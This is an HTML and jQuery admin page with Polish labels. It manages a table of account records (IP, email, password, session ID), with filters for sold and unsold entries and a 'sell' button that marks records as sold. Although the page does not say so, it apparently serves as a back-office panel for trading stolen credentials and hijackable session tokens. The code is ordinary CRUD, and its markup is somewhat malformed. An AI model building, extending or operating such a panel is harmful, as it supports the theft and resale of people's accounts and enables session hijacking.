<html>

<head>
  <title>Zarządzanie</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/v/bs4/jq-3.3.1/dt-1.10.18/b-1.5.6/b-print-1.5.6/fh-3.1.4/r-2.2.2/datatables.min.css" />
</head>

<body>
  <div class="table-responsive table-dark">
    <div align="right">
      <form>
        <input type="button" value="Wszystkie" class="btn btn-primary" onclick="window.location.href='index.php'" />
        <input type="button" value="Sprzedane" class="btn btn-primary" onclick="window.location.href='sprzedane.php'" />
        <input type="button" value="Niesprzedane" class="btn btn-success disabled aria-pressed='true' " " />
      </form>
  </div>
  <div class=" table-responsive table-dark">
    <br/>
    <div align="right">
        <button type="button" name="add" id="add" class="btn btn-info btn-warning">Dodaj nowego użytkownia</button>
    </div>
    <br />
        <div id="alert_message"></div>
        <table id="user_data" class="table table-bordered table-dark table-hover ">
          <caption>Konta</caption>
          <thead class='thead-dark'>
            <tr>
              <th>IP</th>
              <th>Adres Email</th>
              <th>Password</th>
              <th>SessionID</th>
              <th></th>
              <th></th>
            </tr>
          </thead>
        </table>

    </div>


    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"
      integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous">
    </script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"
      integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous">
    </script>
    <script type="text/javascript"
      src="https://cdn.datatables.net/v/bs4/jq-3.3.1/dt-1.10.18/b-1.5.6/b-print-1.5.6/fh-3.1.4/r-2.2.2/datatables.min.js">
    </script>


</body>

</html>

<script type="text/javascript" language="javascript">
  $(document).ready(function () {

    fetch_data();

    function fetch_data() {
      var dataTable = $('#user_data').DataTable({
        "processing": true,
        "serverSide": true,
        "order": [],
        "ajax": {
          url: "fetch2.php",
          type: "POST"
        }
      });
    }

    function update_data(id, column_name, value) {
      $.ajax({
        url: "update.php",
        method: "POST",
        data: {
          id: id,
          column_name: column_name,
          value: value
        },
        success: function (data) {
          $('#alert_message').html('<div class="alert alert-success">' + data + '</div>');
          $('#user_data').DataTable().destroy();
          fetch_data();
        }
      });
      setInterval(function () {
        $('#alert_message').html('');
      }, 5000);
    }

    $(document).on('blur', '.update', function () {
      var id = $(this).data("id");
      var column_name = $(this).data("column");
      var value = $(this).text();
      update_data(id, column_name, value);
    });

    $('#add').click(function () {
      var html = '<tr>';
      html += '<td contenteditable id="data1"></td>';
      html += '<td contenteditable id="data2"></td>';
      html += '<td contenteditable id="data3"></td>';
      html += '<td contenteditable id="data4"></td>';
      html +=
        '<td><button type="button" name="insert" id="insert" class="btn btn-success btn-xs">Dodaj</button></td>';
      html += '</tr>';
      $('#user_data tbody').prepend(html);
    });

    $(document).on('click', '#insert', function () {
      var ip = $('#data1').text();
      var email = $('#data2').text();
      var pass = $('#data3').text();
      var sessionid = $('#data4').text();
      if (ip != '' && email != '' && pass != '' && sessionid != '') {
        $.ajax({
          url: "insert.php",
          method: "POST",
          data: {
            ip: ip,
            email: email,
            pass: pass,
            sessionid: sessionid
          },
          success: function (data) {
            $('#alert_message').html('<div class="alert alert-success">' + data + '</div>');
            $('#user_data').DataTable().destroy();
            fetch_data();
          }
        });
        setInterval(function () {
          $('#alert_message').html('');
        }, 5000);
      } else {
        alert("Wszystkie pola wymagane");
      }
    });

    $(document).on('click', '.delete', function () {
      var id = $(this).attr("id");
      if (confirm("Czy na pewno chcesz usunąć ten rekord z bazy danych?")) {
        $.ajax({
          url: "delete.php",
          method: "POST",
          data: {
            id: id
          },
          success: function (data) {
            $('#alert_message').html('<div class="alert alert-success">' + data + '</div>');
            $('#user_data').DataTable().destroy();
            fetch_data();
          }
        });
        setInterval(function () {
          $('#alert_message').html('');
        }, 5000);
      }
    });
    $(document).on('click', '.sprzedaj', function () {
    
    var id = $(this).attr("id");
    var column_name = ("sprzedane");
    var value = ("tak");
    $.ajax({
      url: "update.php",
      method: "POST",
      data: {
        id:id, column_name:column_name, value:value
      },
      success: function (data) {
        $('#alert_message').html('<div class="alert alert-success">' + data + '</div>');
        $('#user_data').DataTable().destroy();
        fetch_data();
      }
      
      
    });
    setInterval(function () {
      $('#alert_message').html('');
    }, 5000); 
  
});
  });
</script>
